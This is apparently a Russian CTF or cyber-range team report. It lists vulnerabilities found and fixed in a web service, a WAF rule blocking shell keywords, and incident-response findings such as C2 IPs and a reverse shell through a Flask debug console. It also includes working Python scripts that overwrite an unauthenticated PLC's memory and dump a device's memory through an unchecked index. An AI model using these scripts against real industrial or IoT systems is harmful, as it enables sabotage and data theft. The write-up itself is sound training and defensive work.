## Отчет команды "Солнцево" о решенных задачах с развернутым ответом

### 1. Касса WAF
Был обнаружен WAF - ModSecurity.
Мы включили его, проставив опцию `SecStatusEngine On` в `/etc/nginx/modsecurity.d/modsecurity.conf` и добавили правило:
```
SecRule REQUEST_URI|ARGS|REQUEST_BODY “@rx (?i)(system|bash|etc)”  
“phase:2,deny,id:7331,msg:’Forbidden bruhh’,log,auditlog,status:403”
```
### 2. Мониторинг WAF
### 3. Непрошенные гости! - 1
Зашли на гитлаб, посмотрели на код и результаты работы CI (в котором все прогоняется через SonarQube).
Нашли следующие узявимости:
1. **Открытая БД**
	База данных торчит в интернет, а стандартный пароль от нее слабоват
2. **Пароли в БД хранятся в открытом виде**
	Пароли там не хэшируются (правда не везде, вопросы к работоспособности сервиса в целом ¯\\_(ツ)_/¯
3. **SQL-инъекция**
	В `diary/app/mysite/views.py` запросы форматируются f-строками, что приводит к SQL-инъекции
4. **Токены не блокируются**
	Проверка того, что токен заблокирован и блокировка токена происходят в разных ключах в redis, так что блокировка токенов не работает
5. **Ключи от джанго в коде**
	```python
	SECRET_KEY = "Abqh4LSVdohqrlhtalvifAmEsymAvY9p"`
	```
	Знание ключа позволяет подписывать сессии и делать множество других страшных вещей
6. **Пароль от БД в коде**
	```python
	SQLALCHEMY_DATABASE_URL = f'postgresql://postgres:postgres@db:5432/postgres'`
	```
	Пароль, кстати, не всегда правильный, опять вопросы к работоспособности сервиса в целом ¯\\_(ツ)_/¯
7. **CSRF**
	В коде основного приложения вообще все ручки помечены как `@csrf_exempt`, что значит, что они никак не защищены от CSRF.
8. **Debug**
	В конфигурации django параметр Debug - `True`, что **плохо** влияет на общую безопасность
9. **Пароль от почты в коде**
	```python
	mail_password = "adm.school.back"`
	``` 
	Это позволяет получить доступ в почте
10. **Отсутствие аутентификации на сервисе для уведомлений**
	Так как он торчит в интернет, любой человек может отправлять на почту уведомления от имени организации
### 4. Непрошенные гости! - 2
1. Закрыли открытый в интернет порт
2. Сделали так, чтобы все пароли хэшировались
3. Использовали параметризованные запросы вместо f-строк
4. Сделали так, чтобы использовались одинаковые ключи
5. Теперь ключ берется из секретов docker compose
6. Теперь пароль берется из `.env`
7. Убрали все `@csrf_exempt`
8. Убрали Debug-режим
9. Теперь пароль берется из `.env`
10. Закрыли доступ в этот сервис из интернета
###  5. Поезд
Контроллер вообще не имеет никакой аутентификации, так что можно просто записать нашу строчку в память (цикл чтобы не ждать пока поезд остановится):
```python
from snap7.client import Client

while True:
    try:
        client = Client()
        client.connect("10.10.14.2", 0, 1)

        for i in range(200):
            offset = i * 50
            data = b"Solncevo" + b"\x00" * 42
            client.db_write(1, offset, data)
            print(i)

        client.disconnect()

    except:
        pass
```
### 6. Враг врага 1 - 1
Через почту от `admin [at] mai1server.pma.ru`
(1 - фишинг)
### 7. Враг врага 1 - 2
Был скачан архив `np++.zip`, в котором был файл `np++_release.exe` с иконкой `7Zip`.  Этот файл и является вредоносным
### 8. Враг врага 1 - 3
### 9. Враг врага 1 - 4
### 10. Враг врага 1 - 5
### 11. Враг врага 1 - 6
### 12. Враг врага 1 - 7
Скрипт, который запускается в результате активности приложения соединяется с хостом `103.137.250.153:8080`
### 13. Враг врага 1 - 8
Файл `Passwords.xlsx` с паролями.
### 14. Враг врага 2 - 1
На системе хостилось приложение на `Flask` в режиме отладки, с пин-кодом от консоли разработчика `123-456-789`. Злоумышленник прокинул через консоль реверс-шелл и подключился к системе.
### 15. Враг врага 2 - 2
- `81.177.221.242` - загрузка шифровальщика app 
- `10.10.10.12` - проникновение на систему
### 16. Враг врага 2 - 3
- сжатие с помощью [UPX](https://github.com/upx/upx)
- использование `CUSTOM_write` ([пример](https://github.com/tobyxdd/linux-anti-debugging/)) для защиты от дебага через ptrace
### 17. Враг врага 2 - 4
Нашли в Wireshark: `2025-01-22 22:35:52,600366701`
### 18. Враг врага 2 - 5
### 19. Враг врага 2 - 6
### 20. Кроличий горшок 2.0
Погуглив информацию про горшок и поизучав его API, мы нашли уязвимость: команда 1 позволяла получать данные из массива, при этом не проверяя границы - т.е., мы можем читать память горшка. Вот таким скриптом мы сдампили память:
```python
import struct  
import requests  

start_param = 0  
end_param = 10000

with open("meow.bin", "wb") as f:  
  for i in range(start_param, end_param):  
    print(f"[*] Requesting {i}")  
    r = requests.post("http://ADDRESS/control", json={"cmd": 1, "param": i})  
    value = r.json()["value"]  
    if type(value) == int:  
        f.write(struct.pack("<i", value))  
    elif type(value) == float:  
        f.write(struct.pack("<f", value))  
    elif value is None:  
        f.write(struct.pack("<i", 0))  
    else:  
        print("Unknown type!", value)  
    f.flush()
```
Внутри дампа памяти и нашелся флаг.
### 21. WIFI-Роутер
#### Флаг 1.
Если еще немного повыяснять про горшок, можно обнаружить, что в нем хранится пароль от сети, которую он сам же и раздает - проверив строки из дампа, мы смогли зайти на роутер и получить флаг
#### Флаг 2.
Пока не решили :(



